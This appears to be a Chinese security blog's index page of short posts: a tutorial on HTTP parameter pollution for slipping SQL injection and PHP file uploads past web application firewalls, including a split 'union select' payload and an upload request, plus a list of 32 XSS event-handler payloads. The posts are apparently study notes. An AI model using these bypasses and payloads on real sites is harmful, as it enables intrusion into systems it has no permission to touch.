<li>/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。</li>
<li>/var/log/mail/ –  这个子目录包含邮件服务器的额外日志。</li>
<li>/var/log/prelink/ — 包含.so文件被prelink修改的信息。</li>
<li>/var/log/audit/ — 包含被 Linux audit daemon储存的信息。</li>
<li>/var/log/samba/ – 包含由samba存储的信息。</li>
<li>/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。</li>
<li>/var/log/sssd/ – 用于守护进程安全服务。</li>
</ul>
<p>除了手动存档和清除这些日志文件以外，还可以使用logrotate在文件达到一定大小后自动删除。可以尝试用vi，tail，grep和less等命令查看这些日志文件。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/24/sql注入之参数污染绕waf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/24/sql注入之参数污染绕waf/" class="post-title-link" itemprop="url">sql注入之参数污染绕waf</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-24 16:40:04 / 修改时间：16:40:27" itemprop="dateCreated datePublished" datetime="2019-10-24T16:40:04+08:00">2019-10-24</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="hpp参数污染了解"><a href="#hpp参数污染了解" class="headerlink" title="hpp参数污染了解"></a>hpp参数污染了解</h1><p>HPP是HTTP Parameter Pollution的缩写。<br>这个漏洞由S. di Paola 与L. Caret Toni在2009年的OWASP上首次公布。这也是一种注入型的漏洞，攻击者通过在HTTP请求中插入特定的参数来发起攻击。如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。<br>通过hpp参数污染可以达到绕过sqlwaf，上传waf来进行攻击。</p>
<h1 id="hpp参数污染原理"><a href="#hpp参数污染原理" class="headerlink" title="hpp参数污染原理"></a>hpp参数污染原理</h1><p>在跟服务器交互的过程中，http允许 get 或者post多次传同一参数值，造成覆盖达到一些绕过waf的效果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /foo?par1=val1&amp;par2=val2 HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>

<p>如上面的http请求，一般同一参数名字只能传参一次，但是http协议中允许同样名称的参数出现多次。</p>
<p>但是不同的服务器处理方式会不一样，比如：<br>必应</p>
<p><a href="https://s2.ax1x.com/2019/03/11/ACHIeJ.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/ACHIeJ.png" alt="img"></a></p>
<p>我们输入了两次q参数，第一次为aa第二次为bb被覆盖了，</p>
<p>谷歌</p>
<p><a href="https://s2.ax1x.com/2019/03/11/ACbPYt.png" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/11/ACbPYt.png" alt="img"></a></p>
<p>输入两个q参数可以看到都被加载到了浏览器搜索中。没有覆盖</p>
<p>如果同时提供2个搜索的关键字参数给Google，那么Google会对2个参数都进行查询；但是必应则不一样，它只会处理后面一个参数。下面这个表简单列举了一些常见的Web服务器对同样名称的参数出现多次的处理方式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Web服务器               参数获取函数                       获取到的参数</span><br><span class="line"></span><br><span class="line">PHP/Apache           $_GET(“par”)                       Last</span><br><span class="line">JSP/Tomcat           Request.getParameter(“par”)       First</span><br><span class="line">Perl(CGI)/Apache       Param(“par”)                       First</span><br><span class="line">Python/Apache       getvalue(“par”)                   All (List)</span><br><span class="line">ASP/IIS               Request.QueryString(“par”)       All (comma-delimited string)</span><br></pre></td></tr></table></figure>

<h1 id="参数污染实例"><a href="#参数污染实例" class="headerlink" title="参数污染实例"></a>参数污染实例</h1><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>这种服务器的解析方式本身没有什么缺陷，但是如果配合一些waf规则以及其他规则，则有可能造成一些危害，根据waf解析的先后规则则有可能绕过waf设置的原意。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select * from admin where id=1&quot;;</span><br><span class="line">$sql=$sql.&quot;&quot;.$_POST[&apos;bbs&apos;];</span><br><span class="line"></span><br><span class="line">echo $sql;</span><br><span class="line"></span><br><span class="line">$pattern=&apos;/^.*union.*$/&apos;;</span><br><span class="line"></span><br><span class="line">if(preg_match($pattern, $sql))</span><br><span class="line">&#123;echo &quot;注入测试   &quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>在特定情况下 bbs=u&amp;bbs=n&amp;bbs=i&amp;bbs=o&amp;bbs=n&amp;bbs=select 1,user(),3<br>可以绕过一些waf，在CTF中也有出现。<br>将参数分离写入，waf在输入之后就开始拦截，在后端又拼接成完整的union，根据一些特定服务器就可以绕过waf进行注入。</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>先看一个上传数据包。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.1.100</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.1.100/</span><br><span class="line"></span><br><span class="line">Cookie:yunsuo_session_verify=1a9c7117538a7a9bce39a4695ff3f0cc; safedog-flow-item=</span><br><span class="line"></span><br><span class="line">X-Forwarded-For: 1.1.1.1</span><br><span class="line"></span><br><span class="line">CLIENT_IP: 2.2.2.2</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Content-Type:multipart/form-data; boundary=---------------------------440470572354</span><br><span class="line"></span><br><span class="line">Content-Length: 1089</span><br><span class="line"></span><br><span class="line">-----------------------------440470572354</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;n.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Phpinfo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------440470572354</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">-----------------------------440470572354--</span><br></pre></td></tr></table></figure>

<p>Content-Type:multipart/form-data; 指代的是这个数据是来自表单提交的</p>
<p>某些WAF是通过Content-Type识别是否是文件上传数据包。假设我们将Content-Type更改，数据包也是正常提交过去的。这个就完成了一次bypass。</p>
<p>还有的时候就是Content-Disposition: form-data;，也有某些WAF是根据Content-Disposition匹配filename的，用于验证黑名单。我们经过混淆大小写也是可以bypass的。(<a href="http://www.secpulse.com/archives/56523.html" target="_blank" rel="noopener">http://www.secpulse.com/archives/56523.html</a>)</p>
<p>拦截：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/03/waf4.png" target="_blank" rel="noopener"><img src="http://www.secpulse.com/wp-content/uploads/2017/03/waf4.png" alt="img"></a><br><a href="http://www.secpulse.com/wp-content/uploads/2017/03/waf5.png" target="_blank" rel="noopener"><img src="http://www.secpulse.com/wp-content/uploads/2017/03/waf5.png" alt="img"></a></p>
<p>在HPP中最典型的的例子就是“双文件上传”。</p>
<p>就是在协议中，提交两个相同的值，达到欺骗WAF一次匹配的目的。在这里提点一下http协议中参数名与参数值的结构。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/03/waf6-1024x398.png" target="_blank" rel="noopener"><img src="http://www.secpulse.com/wp-content/uploads/2017/03/waf6-1024x398.png" alt="img"></a></p>
<p>可以看到filename参数写了两次，可能绕过一些上传限制。</p>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>当然这种特性有时候也可以测试xss漏洞，原理一样。暂不测试。</p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/24/XSS32个触发事件/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/24/XSS32个触发事件/" class="post-title-link" itemprop="url">XSS32个触发事件</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-24 16:01:26 / 修改时间：16:20:39" itemprop="dateCreated datePublished" datetime="2019-10-24T16:01:26+08:00">2019-10-24</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>1、onmouseenter：当鼠标进入选区执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red&quot; onmouseenter=&quot;alert(bem)&quot;&gt;123456&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>2、onmouseleave：当鼠标离开选区执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV onmouseleave=&quot;alert(‘bem‘)&quot; style=&quot;BACKGROUND-COLOR: red&quot;&gt;123456&lt;/DIV&gt;</span><br></pre></td></tr></table></figure>

<p>3、onmousewheel：当鼠标在选区滚轮时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV onmousewheel=&quot;alert(‘bem‘)&quot; style=&quot;BACKGROUND-COLOR: red&quot;&gt;123456&lt;/DIV&gt;</span><br></pre></td></tr></table></figure>

<p>4、onscroll：拖动滚动条执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;width:100px;height:100px;overflow:scroll&quot; onscroll=&quot;alert(bem)&quot;&gt;123456</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>5、onfocusin：当获得焦点时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red&quot; onfocusin=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>6、onfocusout：当失去焦点时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red&quot; onfocusout=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>7、onstart：当显示内容时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee style=&quot;background-color:red&quot; onstart=&quot;alert(bem)&quot; &gt;asdf&lt;/marquee&gt;</span><br></pre></td></tr></table></figure>

<p>8、onbeforecopy：选中内容后右键执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; onbeforecopy=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>9、onbeforecut：选中内容后右键执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; onbeforecut=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>10、onbeforeeditfocus：当获得焦点时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; contentEditable=&quot;true&quot; onbeforeeditfocus=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>11、onbeforepaste：选中内容后右键执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; =&quot;true&quot; onbeforepaste=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>12、oncontextmenu：鼠标右键执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; oncontextmenu=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>13、oncopy：鼠标右键执行复制时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; oncopy=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>14、oncut：鼠标右键执行剪切时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; oncut=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>15、ondrag：选择内容并拖动时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; ondrag=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>16、ondragend：选择内容并拖动松开鼠标执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; ondragend=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>17、ondragenter：选择内容并拖动时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=&quot;background-color:red;&quot; ondragenter=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>18、ondragleave：选择内容并拖出边框执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragleave=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>19、ondragover：选择内容并拖动时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragover=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>20、ondragstart：选择内容并拖动时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;background-color:red;&quot; ondragstart=&quot;alert(‘bem‘)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>21、ondrop：有内容被拖动进来时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; ondrop=&quot;alert(bem)&quot; &gt;asdf&lt;/div&gt;</span><br><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; ondrop=&quot;alert(bem)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>22、onlosecapture：选择内容时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; onlosecapture=&quot;alert(bem)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>23、onpaste：粘贴时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; onpaste=&quot;alert(bem)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>24、onselectstart：选择内容时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; onselectstart=&quot;alert(bem)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>25、onhelp：进入焦点按F1时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; style=&quot;&quot; onhelp=&quot;alert(bem)&quot; &gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>26、onEnd：当时间线执行完毕时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div STYLE=&quot;behavior:url(#default#time2)&quot; onEnd=&quot;alert(bem)&quot;&gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>27、onBegin：当时间线开始执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div STYLE=&quot;behavior:url(#default#time2)&quot; onBegin=&quot;alert(bem)&quot;&gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>28、onactivate：激活当前标签时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; STYLE=&quot;&quot; onactivate=&quot;alert(bem)&quot;&gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>29、onfilterchange：当滤镜改变时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; STYLE=&quot;filter: Alpha(opacity=100, style=2);&quot; onfilterchange=&quot;alert(bem)&quot;&gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>30、onbeforeactivate：当激活当前标签时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; STYLE=&quot;&quot; onbeforeactivate=&quot;alert(bem)&quot;&gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>31、onbeforedeactivate：当标签内值改变时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; STYLE=&quot;&quot; onbeforedeactivate=&quot;alert(bem)&quot;&gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>32、ondeactivate：当标签内值改变时执行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div contentEditable=&quot;true&quot; STYLE=&quot;&quot; ondeactivate=&quot;alert(bem)&quot;&gt;asdf&lt;/div&gt;</span><br></pre></td></tr></table></figure>


          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/24/Fastjson漏洞分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/24/Fastjson漏洞分析/" class="post-title-link" itemprop="url">Fastjson漏洞分析</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-24 13:53:49 / 修改时间：15:22:58" itemprop="dateCreated datePublished" datetime="2019-10-24T13:53:49+08:00">2019-10-24</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="https://blog.csdn.net/systemino/article/details/95912581" target="_blank" rel="noopener">https://blog.csdn.net/systemino/article/details/95912581</a></p>
<p><a href="https://blog.csdn.net/weixin_38405253/article/details/100607927" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38405253/article/details/100607927</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/24/Json详解以及fastjson使用教程/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/24/Json详解以及fastjson使用教程/" class="post-title-link" itemprop="url">Json详解以及fastjson使用教程</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-24 13:36:46 / 修改时间：13:53:19" itemprop="dateCreated datePublished" datetime="2019-10-24T13:36:46+08:00">2019-10-24</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="https://blog.csdn.net/srj1095530512/article/details/82529759" target="_blank" rel="noopener">https://blog.csdn.net/srj1095530512/article/details/82529759</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/23/PHP魔术方法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="VegyChick">
      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="菜鸟博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/10/23/PHP魔术方法/" class="post-title-link" itemprop="url">PHP魔术方法</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-10-23 11:11:31 / 修改时间：11:20:44" itemprop="dateCreated datePublished" datetime="2019-10-23T11:11:31+08:00">2019-10-23</time>
            </span>
          

          
            

            
          

          

          
            
            
          

          
          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1、get、set"><a href="#1、get、set" class="headerlink" title="1、get、set"></a>1、<strong>get、</strong>set</h3><p>这两个方法是为在类和他们的父类中没有声明的属性而设计的</p>
<p>get( $property )       当调用一个未定义的属性时访问此方法<br>set( $property, $value )    给一个未定义的属性赋值时调用<br>这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</p>
<h3 id="2、isset、unset"><a href="#2、isset、unset" class="headerlink" title="2、isset、unset"></a>2、<strong>isset、</strong>unset</h3><p>isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法<br>unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法<br>与get方法和set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</p>
